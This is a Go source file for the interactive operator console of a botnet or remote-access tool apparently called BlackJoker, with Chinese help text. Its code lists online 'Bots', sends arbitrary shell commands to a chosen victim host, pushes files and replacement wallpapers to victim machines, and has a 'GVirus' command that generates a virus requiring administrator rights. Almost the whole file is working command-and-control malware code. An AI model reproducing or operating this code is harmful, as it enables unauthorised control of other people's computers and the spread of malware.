package main

import (
	VARBLACK "BlackJoker/VarData"
	"bufio"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func handleHelp() {
	fmt.Println("\n####################################\n&& SessionList > 获取在线Bot\n&& Shell {BotName} > 进入某Bot的Shell\n&& exit > 安全退出程序\n&& Attack > 进入特殊攻击模块\n&& GVirus > 生成基础病毒(需要管理员权限运行)\n####################################")
}

//以上为公共函数

func handleSessionList() {
	VARBLACK.Mu.Lock()
	defer VARBLACK.Mu.Unlock()
	if len(VARBLACK.ObtainingOnlineNumberOfPeople) == 0 {
		fmt.Println("没有在线的 Bot")
		return
	}
	for _, session := range VARBLACK.ObtainingOnlineNumberOfPeople {
		fmt.Println(session)
	}
}

func handleExit() {
	os.Exit(0)
}

func handleShell(input string) {
	VARBLACK.FlagBool = false
	hostname := ifAndObtainHostNameExistence(input)
	CommandShell(hostname)
}

func attackAndWallPaper(input string) {
	hostname := ifAndObtainHostNameExistence(input)
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("$ %s Attack|Wallpaper(JpgPath) >>", hostname)
		if scanner.Scan() {
			input := scanner.Text()
			switch {
			case strings.ToLower(input) == "exit":
				return
			case filepath.IsAbs(input):
				imgageType := func() bool {
					switch filepath.Ext(input) {
					case ".png", ".jpg":
						return true
					default:
						return false
					}
				}()
				if imgageType {
					VARBLACK.WallpaperOrUploadFileFlag = true
					VARBLACK.UploadFile <- input //VARBLACK.UploadFile通道控制AttackUploadLocalFile API的阻塞情况
				} else {
					log.Println("不支持的文件类型 支持[.png,.jpg(最好)]")
					VARBLACK.ClientNotificationChannel <- true
				}
			case strings.ToLower(input) == "help":
				fmt.Println("\n####################################\n$$ exit > 返回上一级\n$$ 输入要为客户端更换的壁纸图片的本地绝对路径(Tip:开发者建议执行两次保证任务完成)\n####################################")
			default:
				log.Println("不是路径 使用函数filepath.IsAbs()")
				VARBLACK.ClientNotificationChannel <- true
			}
			select {
			case <-VARBLACK.ClientNotificationChannel:
			case <-time.After(30 * time.Second):
				log.Println("等待客户端通知超时")
			}
		}
	}
}

func attackUploadClient(input string) {
	hostname := ifAndObtainHostNameExistence(input)
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("$ %s Attack|Upload(filePath) >>", hostname)
		if scanner.Scan() {
			input := scanner.Text()
			switch {
			case strings.ToLower(input) == "exit":
				return
			case filepath.IsAbs(input):
				VARBLACK.WallpaperOrUploadFileFlag = false
				VARBLACK.UploadFile <- input
			case strings.ToLower(input) == "help":
				fmt.Println("\n####################################\n$$ exit > 返回上一级\n$$ 输入要发送的文件的绝对路径\n####################################")
			default:
				log.Println("不是有效文件路径")
				VARBLACK.ClientNotificationChannel <- true
			}
			select {
			case <-VARBLACK.ClientNotificationChannel:
			case <-time.After(60 * time.Second):
				log.Println("等待客户端通知超时")
			}
		}
	}
}

func handAttack() {
	fmt.Println("\n####################################\n$$ WallPaper {BotName} > 以本地图片更换指定客户机壁纸\n$$ Upload {BotName} > 发送本地文件到指定客户机\n$$ exit > 返回上一级\n####################################")
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("$ Attack?>> ")
		if scanner.Scan() {
			commandText := scanner.Text()
			switch {
			case strings.ToLower(commandText) == "exit":
				return
			case strings.HasPrefix(strings.ToLower(commandText), "wallpaper"):
				attackAndWallPaper(commandText)
			case strings.HasPrefix(strings.ToLower(commandText), "upload"):
				attackUploadClient(commandText)
			case strings.ToLower(commandText) == "help":
				fmt.Println("\n####################################\n$$ WallPaper {BotName} > 以本地图片更换指定客户机壁纸\n$$ Upload {BotName} > 发送本地文件到指定客户机\n$$ exit > 返回上一级\n####################################")
			default:
				log.Println("找不到该命令")
			}
		}
	}
}

func UserInputLoop() {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		select {
		case commandeering := <-VARBLACK.Command:
			if commandeering == "exit" {
			}
		default:
		}
		fmt.Print("$ JokerOSshell?>> ")
		if scanner.Scan() {
			input := scanner.Text()
			switch {
			case strings.ToLower(input) == "help":
				handleHelp()
			case strings.ToLower(input) == "sessionlist":
				handleSessionList()
			case strings.ToLower(input) == "exit":
				handleExit()
			case strings.HasPrefix(strings.ToLower(input), "shell"):
				handleShell(input)
			case strings.ToLower(input) == "attack":
				handAttack()
			case strings.ToLower(input) == "gvirus":
				fmt.Println("--------------------------------------------------------------------------------------------------------------------")
				fmt.Println("需要管理员权限运行,需要Pyinstaller工具支持,如果没有该工具,病毒源代码将会生成在.\\Virus目录中,程序将输出生成结果方便观察和排错\n病毒依赖文件R-Cadimn.jpg文件,运行时请确保R-Cadimn.jpg与病毒处于同一目录,当病毒出次运行后,则不需要")
				fmt.Println("--------------------------------------------------------------------------------------------------------------------")
				AttackGVirus()
			default:
				log.Println("找不到该命令")
			}
		} else {
			break
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading standard input:", err)
	}
}

func CommandShell(hostname string) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("$ %s Shell?>> ", hostname)
		if scanner.Scan() {
			commandString := scanner.Text()

			if commandString == "exit" {
				return
			}
			select {
			case VARBLACK.Command <- commandString:
				VARBLACK.FlagBool = true

			default:
				log.Println("Command channel is full, unable to send data")
				VARBLACK.ClientNotificationChannel <- true
			}
			select {
			case <-VARBLACK.ClientNotificationChannel:
			case <-time.After(30 * time.Second):
				log.Println("等待客户端通知超时")
			}
		} else {
			break
		}
	}
	if err := scanner.Err(); err != nil {
		log.Println("Error reading standard input:", err)
	}
}

func banner() {
	banners := " ____  _     ____  ____  _  __    _  ____  _  __ _____ ____ \n/  __\\/ \\   /  _ \\/   _\\/ |/ /   / |/  _ \\/ |/ //  __//  __\\\n| | //| |   | / \\||  /  |   /    | || / \\||   / |  \\  |  \\/|\n| |_\\\\| |_/\\| |-|||  \\_ |   \\ /\\_| || \\_/||   \\ |  /_ |    /\n\\____/\\____/\\_/ \\|\\____/\\_|\\_\\\\____/\\____/\\_|\\_\\\\____\\\\_/\\_\\\n"
	fmt.Println(banners)
}

func InteractiveMain() {
	time.Sleep(time.Second * 2)
	banner()
	UserInputLoop()
}
